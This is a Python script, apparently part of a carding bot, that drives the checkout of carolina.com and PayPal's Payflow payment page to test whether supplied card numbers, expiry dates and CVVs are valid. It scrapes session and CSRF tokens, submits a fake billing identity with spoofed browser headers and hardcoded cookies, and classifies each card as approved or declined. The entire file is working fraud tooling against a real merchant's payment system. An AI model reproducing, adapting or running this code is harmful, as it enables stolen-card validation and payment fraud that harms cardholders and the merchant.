from all.configs._def_main_ import *


async def draken(cc, mes, ano, cvv):
    ssl_context = ssl.create_default_context(cafile=certifi.where())
    conn = aiohttp.TCPConnector(ssl=ssl_context)
    async with aiohttp.ClientSession(connector=conn) as session:
        async with session.get('https://www.carolina.com/checkout/billing.jsp') as req1:
            texto_1 = await req1.text()

            _dynSessConf = parseX(
                texto_1, '<input name="_dynSessConf" type="hidden" value="', '"'
            )

            headers = {
                'Accept': 'text/json',
                'Accept-Language': 'es-419,es;q=0.9',
                'Cache-Control': 'no-cache',
                'Connection': 'keep-alive',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Origin': 'https://www.carolina.com',
                'Pragma': 'no-cache',
                'Referer': 'https://www.carolina.com/checkout/billing.jsp?_requestid=3230224',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
                'X-Requested-With': 'XMLHttpRequest',
                'newrelic': 'eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjMxNzYxNzIiLCJhcCI6IjQ5NzgyMTQyMSIsImlkIjoiZjA4ZTQ0MGMwNDQwYzQ1YSIsInRyIjoiODU2Y2UxZDJiMTcyMzAwMjQ0Yzk1ZGQxNjQxNzJiZjAiLCJ0aSI6MTcxMzgyMzg5NDg1NX19',
                'sec-ch-device-memory': '4',
                'sec-ch-ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
                'sec-ch-ua-arch': '"x86"',
                'sec-ch-ua-full-version-list': '"Chromium";v="124.0.6367.61", "Google Chrome";v="124.0.6367.61", "Not-A.Brand";v="99.0.0.0"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-model': '""',
                'sec-ch-ua-platform': '"Windows"',
                'traceparent': '00-856ce1d2b172300244c95dd164172bf0-f08e440c0440c45a-01',
                'tracestate': '3176172@nr=0-1-3176172-497821421-f08e440c0440c45a----1713823894855',
            }

            params = {
                '_requestid': '3230224',
            }

            data = {
                '_dyncharset': 'UTF-8',
                '_dynSessConf': _dynSessConf,
                '/atg/commerce/order/purchase/PaymentGroupFormHandler.updateAddressErrorURL': '/checkout/billing.jsp',
                '_D:/atg/commerce/order/purchase/PaymentGroupFormHandler.updateAddressErrorURL': ' ',
                '/atg/commerce/order/purchase/PaymentGroupFormHandler.updateAddressSuccessURL': '/checkout/review.jsp',
                '_D:/atg/commerce/order/purchase/PaymentGroupFormHandler.updateAddressSuccessURL': ' ',
                '/atg/commerce/order/purchase/PaymentGroupFormHandler.applyPaymentGroupsSuccessURL': '/checkout/review.jsp',
                '_D:/atg/commerce/order/purchase/PaymentGroupFormHandler.applyPaymentGroupsSuccessURL': ' ',
                '/atg/commerce/order/purchase/PaymentGroupFormHandler.applyPaymentGroupsErrorURL': '/checkout/billing.jsp',
                '_D:/atg/commerce/order/purchase/PaymentGroupFormHandler.applyPaymentGroupsErrorURL': ' ',
                'firstName': 'jorge',
                '_D:firstName': ' ',
                'lastName': 'garcia',
                '_D:lastName': ' ',
                'address1': 'street allen 32',
                '_D:address1': ' ',
                'postalCode': '10080',
                '_D:postalCode': ' ',
                '/atg/commerce/order/purchase/PaymentGroupFormHandler.zipcodeApiResponseCode': '0',
                '_D:/atg/commerce/order/purchase/PaymentGroupFormHandler.zipcodeApiResponseCode': ' ',
                'city': 'New York',
                '_D:city': ' ',
                '_D:state': ' ',
                'state': 'NY',
                'userTypingInterval': '300',
                '/atg/commerce/order/purchase/PaymentGroupFormHandler.applyPayPalPayment': 'true',
                '_D:/atg/commerce/order/purchase/PaymentGroupFormHandler.applyPayPalPayment': ' ',
                '_DARGS': '/checkout/gadgets/billing-form.jsp.billing_addr_form',
            }

            async with session.post('https://www.carolina.com/checkout/billing.jsp', params=params, headers=headers, data=data) as req2:
                texto_2 = await req2.text()

                securetoken = parseX(texto_2, "SECURETOKEN=", "&").strip()
                securetokenid = parseX(texto_2, "SECURETOKENID=", "&").strip()

                cookies = {
                    'enforce_policy': 'ccpa',
                    'ts_c': 'vr%3Da653792318e0ad112864a7d0faae866e%26vt%3D049050c718f645464db25321e6ec74f8',
                    'tsrce': 'checkoutjs',
                    'ts': 'vreXpYrS%3D1808376903%26vteXpYrS%3D1713770703%26vr%3Da653792318e0ad112864a7d0faae866e%26vt%3D049050c718f645464db25321e6ec74f8%26vtyp%3Dreturn',
                }

                headers = {
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'accept-language': 'es-419,es;q=0.9',
                    'cache-control': 'no-cache',
                    'pragma': 'no-cache',
                    'priority': 'u=0, i',
                    'referer': 'https://www.carolina.com/',
                    'sec-ch-ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'iframe',
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-site': 'cross-site',
                    'sec-fetch-user': '?1',
                    'upgrade-insecure-requests': '1',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
                }

                params = {
                    'RESULT': '0',
                    'SECURETOKEN': securetoken,
                    'SECURETOKENID': securetokenid,
                    'RESPMSG': 'Approved',
                }

                async with session.get('https://payflowlink.paypal.com/', params=params, cookies=cookies, headers=headers) as req3:
                    texto_3 = await req3.text()

                    csfr_token = parseX(texto_3, '<input name="CSRF_TOKEN" type="hidden" value="', '"')

                    cookies = {
                        'enforce_policy': 'ccpa',
                        'tsrce': 'checkoutjs',
                        'PAYFLOWCOOKIE': '02c7df8377-7c7d-4cOLcZJqU0OnZ6C6-067QLps9KUYXB0x3ej0EY4hQfzJvb7PFg68SAivrl4awjIvvkOMo',
                        'ts_c': 'vr%3Da653792318e0ad112864a7d0faae866e%26vt%3D07dd2ca918f0a8a1d107cdf0f285220c',
                        'ts': 'vreXpYrS%3D1808431892%26vteXpYrS%3D1713825692%26vr%3Da653792318e0ad112864a7d0faae866e%26vt%3D07dd2ca918f0a8a1d107cdf0f285220c%26vtyp%3Dreturn',
                        'tcs': 'Payflow%3APaymentPage%3ATemplateC%7Cbtn_pay_cc',
                    }

                    headers = {
                        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                        'accept-language': 'es-419,es;q=0.9',
                        'cache-control': 'no-cache',
                        'content-type': 'application/x-www-form-urlencoded',
                        'origin': 'https://payflowlink.paypal.com',
                        'pragma': 'no-cache',
                        'priority': 'u=0, i',
                        'referer': 'https://payflowlink.paypal.com/?RESULT=0&SECURETOKEN=WWBz6vaGOFkSxqb5Ee9U9gAM3&SECURETOKENID=ujczT3FzMXqa9cBho1DxTcaWmnAm&RESPMSG=Approved',
                        'sec-ch-ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
                        'sec-ch-ua-mobile': '?0',
                        'sec-ch-ua-platform': '"Windows"',
                        'sec-fetch-dest': 'iframe',
                        'sec-fetch-mode': 'navigate',
                        'sec-fetch-site': 'same-origin',
                        'sec-fetch-user': '?1',
                        'upgrade-insecure-requests': '1',
                        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
                    }

                    data = [
                        ('subaction', ''),
                        ('CARDNUM', cc),
                        ('EXPMONTH', mes),
                        ('EXPYEAR', ano),
                        ('CVV2', cvv),
                        ('startdate_month', ''),
                        ('startdate_year', ''),
                        ('issue_number', ''),
                        ('METHOD', 'C'),
                        ('PAYMETHOD', 'C'),
                        ('FIRST_NAME', 'jorge'),
                        ('LAST_NAME', 'garcia'),
                        ('template', ''),
                        ('ADDRESS', 'street allen 32'),
                        ('CITY', 'New York'),
                        ('STATE', 'NY'),
                        ('ZIP', '10080'),
                        ('COUNTRY', 'US'),
                        ('PHONE', ''),
                        ('EMAIL', ''),
                        ('SHIPPING_FIRST_NAME', ''),
                        ('SHIPPING_LAST_NAME', ''),
                        ('ADDRESSTOSHIP', ''),
                        ('CITYTOSHIP', ''),
                        ('STATETOSHIP', ''),
                        ('ZIPTOSHIP', ''),
                        ('COUNTRYTOSHIP', ''),
                        ('PHONETOSHIP', ''),
                        ('EMAILTOSHIP', ''),
                        ('TYPE', 'A'),
                        ('SHIPAMOUNT', '0.00'),
                        ('TAX', '0.00'),
                        ('VERBOSITY', 'HIGH'),
                        ('flag3dSecure', ''),
                        ('STATE', 'NY'),
                        ('swipeData', '0'),
                        ('SECURETOKEN', securetoken),
                        ('SECURETOKENID', securetokenid),
                        ('PARMLIST', ''),
                        ('MODE', ''),
                        ('CSRF_TOKEN', csfr_token),
                        ('referringTemplate', 'minlayout'),
                    ]

                    async with session.post('https://payflowlink.paypal.com/processTransaction.do', cookies=cookies, headers=headers, data=data) as response:
                        try:
                            response_text = await response.text()
                            soup = BeautifulSoup(response_text, 'lxml')

                            if int(response_text.find('name="PROCCVV2"')) > 0:
                                if (int(response_text.find('Verified')) > 0) or (int(response_text.find('CVV2 Mismatch')) > 0) or (int(response_text.find('Insufficient funds available')) > 0):
                                    AVSDATA = soup.find("input", {"name": "AVSDATA"})["value"]
                                    PROCCVV2 = soup.find("input", {"name": "PROCCVV2"})["value"]
                                    RESPMSG = soup.find("input", {"name": "RESPMSG"})["value"]
                                    return "Approved", RESPMSG, AVSDATA, PROCCVV2
                                else:
                                    AVSDATA = soup.find("input", {"name": "AVSDATA"})["value"]
                                    PROCCVV2 = soup.find("input", {"name": "PROCCVV2"})["value"]
                                    RESPMSG = soup.find("input", {"name": "RESPMSG"})["value"]
                                    return "Declined", RESPMSG, AVSDATA, PROCCVV2
                            elif (int(response_text.find('Verified')) > 0) or (int(response_text.find('CVV2 Mismatch')) > 0) or (int(response_text.find('Insufficient funds available')) > 0):
                                RESPMSG = soup.find("input", {"name": "RESPMSG"})["value"]
                                return "ApprovedSinCVV", RESPMSG
                            elif (int(response_text.find('name="RESPMSG"')) > 0):
                                RESPMSG = soup.find("input", {"name": "RESPMSG"})["value"]
                                return "DeclinedSinCVV", RESPMSG
                            else:
                                print(response_text)
                                return "An unexpected error occurred in response. It was not generated correctly. ⚠️"
                        except (aiohttp.client_exceptions.ServerDisconnectedError, asyncio.exceptions.TimeoutError, aiohttp.client_exceptions.ClientConnectorError):
                            return "An unexpected error occurred. Timeout Error. ♻️"

